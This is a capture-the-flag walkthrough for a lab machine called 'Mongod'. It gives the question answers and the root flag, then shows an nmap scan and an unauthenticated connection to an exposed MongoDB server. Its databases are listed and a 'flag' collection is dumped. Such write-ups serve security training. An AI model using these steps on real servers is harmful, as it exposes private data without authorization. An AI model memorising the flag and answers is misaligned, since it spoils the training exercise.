# Mongod

## Questions

##### How many TCP ports are open on the machine?

```
2
```

##### Which service is running on port 27017 of the remote host?

```
MongoDB 3.6.8
```

##### What type of database is MongoDB? (Choose: SQL or NoSQL)
 
```
NoSQL
```

##### What is the command name for the Mongo shell that is installed with the mongodb-clients package?

```
mongo
```

##### What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)

```
show dbs
```

##### What is the command used for listing out the collections in a database? (No need to include a trailing ;)

```
show collections
```

##### What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

```
db.flag.find().pretty()
```

##### Submit root flag

```
1b6e6fb359e7c40241b6d431427ba6ea
```

## Commands

### Scan

```
┌──(darshan㉿kali)-[~]
└─$ nmap -sV -p- 10.129.145.116 --min-rate 5000                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 09:49 EST
Nmap scan report for 10.129.145.116
Host is up (0.12s latency).
Not shown: 65523 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
15297/tcp filtered unknown
18249/tcp filtered unknown
27017/tcp open     mongodb MongoDB 3.6.8
35313/tcp filtered unknown
39092/tcp filtered unknown
45369/tcp filtered unknown
49424/tcp filtered unknown
49545/tcp filtered unknown
50172/tcp filtered unknown
50609/tcp filtered unknown
53331/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.41 seconds

```

### MongoDB
```
┌──(darshan㉿kali)-[~]
└─$ sudo apt install mongodb
```

```
┌──(darshan㉿kali)-[~]
└─$ mongo mongodb://10.129.143.75:27017
MongoDB shell version v6.0.1
connecting to: mongodb://10.129.143.75:27017/?compressors=disabled&gssapiServiceName=mongodb
compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("d732a698-b4ef-42d3-b3ae-d608e4802c33") }
MongoDB server version: 3.6.8
WARNING: shell and server versions do not match
================
Warning: the "mongo" shell has been superseded by "mongosh",
which delivers improved usability and compatibility.The "mongo" shell has been deprecated and will be removed in
an upcoming release.
For installation instructions, see
https://docs.mongodb.com/mongodb-shell/install/
================
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	https://docs.mongodb.com/
Questions? Try the MongoDB Developer Community Forums
	https://community.mongodb.com
---
The server generated these startup warnings when booting: 
2022-10-08T14:49:44.575+0000 I STORAGE  [initandlisten] 
2022-10-08T14:49:44.575+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2022-10-08T14:49:44.575+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2022-10-08T14:49:48.017+0000 I CONTROL  [initandlisten] 
2022-10-08T14:49:48.017+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2022-10-08T14:49:48.017+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2022-10-08T14:49:48.017+0000 I CONTROL  [initandlisten] 
---

```

```
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB

```


```
> use sensitive_information
switched to db sensitive_information
```

```
> show collections
flag
```

```
> db.flag.find().pretty()
{
        "_id" : ObjectId("630e3dbcb82540ebbd1748c5"),
        "flag" : "1b6e6fb359e7c40241b6d431427ba6ea"
}

```
